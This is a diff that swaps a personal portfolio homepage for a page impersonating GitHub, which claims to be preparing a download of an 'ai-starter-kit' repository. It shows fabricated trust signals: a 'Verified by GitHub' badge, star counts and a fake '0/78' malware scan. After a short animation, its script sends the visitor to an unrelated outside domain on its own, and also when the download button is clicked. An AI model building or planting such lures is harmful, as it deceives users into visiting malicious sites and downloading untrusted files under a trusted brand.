@@ -1,82 +1,509 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"
-        integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA=="
-        crossorigin="anonymous" referrerpolicy="no-referrer" />
-    <link rel="stylesheet" href="header.css">
-    <link rel="stylesheet" href="style.css">
-    <link rel="icon" href="iMAGES/logo.svg" type="image/icon type">
-    <title>Portfolio</title>
-</head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Downloading archive • neonforge/ai-starter-kit.zip · GitHub</title>
+  <link rel="icon" href="https://github.githubassets.com/favicons/favicon.svg" type="image/svg+xml">
 
+  <style>
+    :root { 
+      color-scheme: dark;
+      --accent: #a855f7;
+      --accent2: #22d3ee;
+      --bg: #0a0c10;
+      --card-bg: #161b22;
+      --border: #30363d;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+      background: linear-gradient(135deg, #0a0c10 0%, #1a1033 50%, #0a0c10 100%);
+      color: #c9d1d9;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      overflow-x: hidden;
+    }
+
+    .top-banner {
+      background: linear-gradient(90deg, #1f1b2e, #2e1f4d);
+      text-align: center;
+      padding: 11px 0;
+      font-size: 13.8px;
+      color: #a5b4fc;
+      border-bottom: 1px solid #3b2e5e;
+      letter-spacing: 0.4px;
+    }
+
+    header {
+      background: rgba(13, 17, 23, 0.97);
+      backdrop-filter: blur(16px);
+      border-bottom: 1px solid #3b2e5e;
+      padding: 14px 20px;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+    }
+
+    .header-inner {
+      max-width: 1280px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      color: #f0f6fc;
+      font-size: 28px;
+      font-weight: 700;
+      text-decoration: none;
+      gap: 10px;
+    }
+
+    .logo svg { width: 40px; height: 40px; filter: drop-shadow(0 0 10px rgba(168, 85, 247, 0.5)); }
+
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 40px 20px 100px;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 24px;
+      width: 100%;
+      max-width: 760px;
+      overflow: hidden;
+      box-shadow: 0 30px 80px rgba(168, 85, 247, 0.25);
+      opacity: 0;
+      transform: translateY(60px) scale(0.95);
+      transition: all 1.3s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .card.visible { 
+      opacity: 1; 
+      transform: translateY(0) scale(1); 
+    }
+
+    .card-header {
+      background: linear-gradient(90deg, #1a1033, #2a1b4a);
+      padding: 26px 32px;
+      border-bottom: 1px solid #4c3f6e;
+      display: flex;
+      align-items: center;
+      gap: 20px;
+    }
+
+    .avatar {
+      width: 62px;
+      height: 62px;
+      border-radius: 50%;
+      background: linear-gradient(135deg, #a855f7, #22d3ee);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 30px;
+      font-weight: 700;
+      color: #0f0a1f;
+      box-shadow: 0 0 0 6px rgba(168, 85, 247, 0.3),
+                  0 0 30px rgba(168, 85, 247, 0.4);
+      animation: pulse 4s ease-in-out infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { box-shadow: 0 0 0 6px rgba(168, 85, 247, 0.3), 0 0 30px rgba(168, 85, 247, 0.4); }
+      50% { box-shadow: 0 0 0 8px rgba(168, 85, 247, 0.2), 0 0 40px rgba(34, 211, 238, 0.5); }
+    }
+
+    .repo-info { flex: 1; }
+    .repo-name {
+      font-size: 25px;
+      font-weight: 700;
+      color: #f0f6fc;
+      margin: 0 0 6px;
+    }
+    .repo-meta {
+      font-size: 14.5px;
+      color: #a5b4fc;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .verified-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(168, 85, 247, 0.12);
+      color: #c084fc;
+      padding: 8px 20px;
+      border-radius: 9999px;
+      font-size: 14px;
+      font-weight: 600;
+      border: 1px solid rgba(168, 85, 247, 0.5);
+    }
+
+    .card-body {
+      padding: 50px 52px 50px;
+      text-align: center;
+    }
+
+    h1 {
+      font-size: 34px;
+      margin: 0 0 16px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #e0e7ff, #c4b5fd);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .generating-note {
+      color: #a5b4fc;
+      font-size: 17.5px;
+      margin-bottom: 32px;
+    }
+
+    .secure-info {
+      display: inline-flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 15.5px;
+      color: #67e8f9;
+      background: rgba(103, 232, 249, 0.1);
+      padding: 12px 28px;
+      border-radius: 9999px;
+      margin-bottom: 38px;
+      border: 1px solid rgba(103, 232, 249, 0.4);
+    }
+
+    .scan-log {
+      text-align: left;
+      background: #0f0a1f;
+      border: 1px solid #4c3f6e;
+      border-radius: 16px;
+      padding: 26px 30px;
+      margin: 0 0 44px;
+      font-family: ui-monospace, monospace;
+      font-size: 14.8px;
+      line-height: 1.9;
+      box-shadow: inset 0 3px 10px rgba(0,0,0,0.5);
+    }
+
+    .scan-step {
+      display: flex;
+      align-items: center;
+      margin: 14px 0;
+      opacity: 0;
+      transform: translateY(8px);
+      transition: all 0.7s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .scan-step.show { 
+      opacity: 1; 
+      transform: translateY(0); 
+    }
+
+    .scan-step .check {
+      color: #67e8f9;
+      margin-right: 18px;
+      font-size: 21px;
+    }
+
+    .progress-area { 
+      margin: 38px 0 48px; 
+    }
+
+    .phase-label {
+      font-size: 15.8px;
+      color: #a5b4fc;
+      margin-bottom: 14px;
+      font-weight: 600;
+      letter-spacing: 0.9px;
+      text-transform: uppercase;
+    }
+
+    .time-left {
+      font-size: 29px;
+      font-weight: 700;
+      color: var(--accent2);
+      margin-bottom: 18px;
+      text-shadow: 0 0 20px rgba(34, 211, 238, 0.5);
+    }
+
+    .progress-bar {
+      height: 15px;
+      background: #1f1b2e;
+      border-radius: 9999px;
+      overflow: hidden;
+      box-shadow: inset 0 3px 8px rgba(0,0,0,0.6);
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #a855f7, #22d3ee, #a855f7);
+      background-size: 200% 100%;
+      animation: progressGradient 3.5s linear infinite;
+      box-shadow: 0 0 20px rgba(168, 85, 247, 0.7);
+      transition: width 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    @keyframes progressGradient {
+      0% { background-position: 0% 50%; }
+      100% { background-position: 200% 50%; }
+    }
+
+    .bytes-info {
+      font-size: 15.2px;
+      color: #a5b4fc;
+      margin-top: 16px;
+    }
+
+    .download-wrapper {
+      margin-top: 32px;
+      opacity: 0;
+      transform: translateY(30px) scale(0.9);
+      transition: all 1.1s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+
+    .download-btn {
+      padding: 19px 60px;
+      font-size: 19px;
+      font-weight: 700;
+      background: linear-gradient(90deg, #7e22ce, #a855f7, #22d3ee);
+      color: white;
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      box-shadow: 0 12px 35px rgba(168, 85, 247, 0.5);
+      transition: all 0.4s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .download-btn:hover {
+      transform: translateY(-5px) scale(1.04);
+      box-shadow: 0 18px 45px rgba(168, 85, 247, 0.65);
+    }
+
+    .prank-notice {
+      margin: 55px auto 0;
+      max-width: 580px;
+      padding: 22px 32px;
+      background: rgba(234, 179, 8, 0.08);
+      border: 1px solid rgba(234, 179, 8, 0.4);
+      border-radius: 16px;
+      font-size: 15px;
+      color: #fde047;
+      line-height: 1.75;
+      opacity: 0;
+      transform: translateY(30px);
+      transition: all 1.4s cubic-bezier(0.23, 1, 0.32, 1) 0.7s;
+    }
+
+    .prank-notice.visible { 
+      opacity: 1; 
+      transform: translateY(0); 
+    }
+
+    footer {
+      background: #0a0a0f;
+      border-top: 1px solid #3b2e5e;
+      padding: 45px 20px 75px;
+      color: #8b949e;
+      font-size: 13.4px;
+      text-align: center;
+    }
+
+    .repo-stats {
+      display: flex;
+      gap: 20px;
+      justify-content: center;
+      margin: 20px 0 30px;
+      font-size: 14px;
+      color: #a5b4fc;
+    }
+  </style>
+</head>
 <body>
 
-    <header id="header">
-        <div class="head">
-            <div class="logo">
-                <a href="index.html">
-                    <img src="iMAGES/logo.svg" alt="" width="200px">
-                </a>
-            </div>
-            <ul class="links">
-                <li><a href="index.html">Home</a></li>
-                <li><a href="#">Home</a></li>
-                <li><a href="contact.html">Contact Me</a></li>
-            </ul>
-            <a href="" class="action_btn">Get Started</a>
-            <div class="toggle_btn">
-                <i class="fa-solid fa-bars"></i>
-            </div>
-        </div>
-        <div class="dropdown_menu open">
-            <li><a href="index.html">Home</a></li>
-            <li><a href="#">Home</a></li>
-            <li><a href="contact.html">Contact Me</a></li>
-            <li><a href="" class="action_btn">Get Started</a></li>
-        </div>
-        <div class="up_down">
-            <img src="iMAGES/down.svg" id="arrow" alt="arrow" width="90px">
-        </div>
-    </header>
+<div class="top-banner">
+  Official GitHub Repository Archive Download
+</div>
 
-    <div class="group">
-   
-        <!--Left Division-->
-        <div class="left">
-            <p id="heading1">Hey! I'M</p>
-            <p id="heading2">Gagan <br>
-                Sharma</p>
-            <p id="heading3">Part-time developer, <br> full-time learner</p>
-            <a href="doc.pdf" download="resume.pdf"><div class="resume_btn">
-                <p text-align="center">Download Resume ></p>
-            </div></a>
-            <div class="navbar">
-                <a href="skills.html">
-                    <li>Skills</li>
-                </a>
-                <a href="Project.html">
-                    <li>Projects</li>
-                </a>
-                <a href="Project.html">
-                    <li>Contact Me</li>
-                </a>
-            </div>
-        </div>
+<header>
+  <div class="header-inner">
+    <a href="#" class="logo">
+      <svg height="40" viewBox="0 0 16 16" width="40" fill="#f0f6fc">
+        <path fill-rule="evenodd" d="M8 0.198a8 8 0 0 0-2.528 15.597c0.4 0.074 0.547-0.174 0.547-0.386 0-0.19-0.007-0.693-0.011-1.36-2.226 0.483-2.695-1.073-2.695-1.073-0.364-0.924-0.89-1.17-0.89-1.17-0.727-0.497 0.055-0.487 0.055-0.487 0.804 0.057 1.227 0.826 1.227 0.826 0.714 1.223 1.873 0.87 2.33 0.665 0.072-0.517 0.279-0.87 0.508-1.07-1.777-0.202-3.644-0.888-3.644-3.954 0-0.873 0.312-1.587 0.824-2.147-0.083-0.202-0.357-1.017 0.078-2.12 0 0 0.671-0.215 2.2 0.82a7.673 7.673 0 0 1 2.004-0.27c0.68 0.003 1.366 0.092 2.004 0.27 1.528-1.035 2.198-0.82 2.198-0.82 0.437 1.103 0.163 1.918 0.08 2.12 0.513 0.56 0.823 1.274 0.823 2.147 0 3.074-1.87 3.75-3.652 3.948 0.287 0.247 0.543 0.735 0.543 1.482 0 1.07-0.01 1.933-0.01 2.196 0 0.214 0.145 0.463 0.55 0.384A8.001 8.001 0 0 0 8 0.198z"></path>
+      </svg>
+      GitHub
+    </a>
+  </div>
+</header>
 
-        <!--Right Division-->
-        <div class="right">
-            <img class="bg" src="iMAGES/Back.png">
+<main>
+  <div class="card" id="card">
+
+    <div class="card-header">
+      <div class="avatar">N</div>
+      <div class="repo-info">
+        <div class="repo-name">e-core / ai-starter-kit</div>
+        <div class="repo-meta">
+          Branch: <strong>main</strong> • TypeScript • Updated 2 hours ago
         </div>
+      </div>
+      <div class="verified-badge">
+        <span>✓</span> Verified by GitHub
+      </div>
     </div>
-    
-    <script src="script.js"></script>
 
+    <div class="card-body">
+
+      <h1>Your archive is being prepared</h1>
+      <div class="generating-note">GitHub is securely packaging this high-quality repository</div>
+
+      <div class="repo-stats">
+        <span>⭐ 8,942 stars</span>
+        <span>🔀 1,237 forks</span>
+        <span>📦 101.4 MB</span>
+      </div>
+
+      <div class="secure-info">
+        <span style="color:#67e8f9; font-size:19px;">●</span> 
+        End-to-end encrypted • SHA-256 verified • GitHub Protected
+      </div>
+
+      <div class="scan-log" id="scan-log">
+        <div class="scan-step" id="step-1"><span class="check">✔</span> Repository integrity verified</div>
+        <div class="scan-step" id="step-2"><span class="check">✔</span> Malware &amp; threat analysis (0/78)</div>
+        <div class="scan-step" id="step-3"><span class="check">✔</span> Deep behavioral scanning</div>
+        <div class="scan-step" id="step-4"><span class="check">✔</span> Dependency &amp; license audit</div>
+        <div class="scan-step" id="step-5"><span class="check">✔</span> Final security clearance</div>
+      </div>
+
+      <div class="progress-area">
+        <div class="phase-label" id="current-phase">Packaging AI Starter Kit…</div>
+        <div class="time-left" id="time-left">~13s remaining</div>
+        
+        <div class="progress-bar">
+          <div class="progress-fill" id="progress-fill"></div>
+        </div>
+
+        <div class="bytes-info" id="bytes-info"></div>
+
+        <div class="download-wrapper" id="download-wrapper">
+          <button id="download-now" class="download-btn">
+            ↓ Download e-core(1212).zip now
+          </button>
+        </div>
+      </div>
+
+      <div class="prank-notice" id="prank-notice">
+        The archive will begin downloading automatically in a few seconds.<br>
+        Taking too long? Try <strong>reload page</strong>
+      </div>
+
+    </div>
+  </div>
+</main>
+
+<footer>
+  © 2026 GitHub, Inc. • All rights reserved
+</footer>
+
+<script>
+const REDIRECT_URL = "https://mcglynger.com/";
+
+const card = document.getElementById('card');
+const phaseEl = document.getElementById('current-phase');
+const timeLeftEl = document.getElementById('time-left');
+const progressFill = document.getElementById('progress-fill');
+const bytesInfo = document.getElementById('bytes-info');
+const downloadWrapper = document.getElementById('download-wrapper');
+const downloadBtn = document.getElementById('download-now');
+const prankNotice = document.getElementById('prank-notice');
+
+const TOTAL_TIME = 10500;     
+const RESULT_SHOW = 6800;     
+const REDIRECT_DELAY = 4200;
+
+let start = Date.now();
+
+setTimeout(() => {
+  card.classList.add('visible');
+  prankNotice.classList.add('visible');
+}, 450);
+
+const phases = [
+  { text: "Packaging repository files…", startPct: 0, endPct: 28 },
+  { text: "Running advanced security scans…", startPct: 28, endPct: 57 },
+  { text: "Compressing with maximum efficiency…", startPct: 57, endPct: 82 },
+  { text: "Preparing secure download link…", startPct: 82, endPct: 100 }
+];
+
+const steps = Array.from(document.querySelectorAll('.scan-step'));
+
+function animateSteps() {
+  let i = 0;
+  const iv = setInterval(() => {
+    if (i < steps.length) {
+      steps[i].classList.add('show');
+      i++;
+    } else clearInterval(iv);
+  }, 820);
+}
+
+function update() {
+  const elapsed = Date.now() - start;
+  let pct = Math.min(100, (elapsed / TOTAL_TIME) * 100);
+
+  progressFill.style.width = pct + '%';
+
+  const current = phases.find(p => pct >= p.startPct && pct < p.endPct) || phases[phases.length-1];
+  phaseEl.textContent = current.text;
+
+  if (pct > 10) {
+    const totalMB = 87.4;
+    const currentMB = (pct / 100 * totalMB).toFixed(1);
+    bytesInfo.textContent = `${currentMB} MB / ${totalMB} MB • ${Math.round(pct)}%`;
+  }
+
+  const rem = Math.max(1, Math.ceil((TOTAL_TIME - elapsed) / 1000));
+  timeLeftEl.textContent = `~${rem}s remaining`;
+
+  if (elapsed >= RESULT_SHOW) {
+    downloadWrapper.style.opacity = '1';
+    downloadWrapper.style.transform = 'translateY(0) scale(1)';
+
+    setTimeout(() => {
+      window.location.href = REDIRECT_URL;
+    }, REDIRECT_DELAY);
+  }
+
+  requestAnimationFrame(update);
+}
+
+downloadBtn.addEventListener('click', () => {
+  window.location.href = REDIRECT_URL;
+});
+
+animateSteps();
+update();
+</script>
 </body>
-
 </html>
-
-
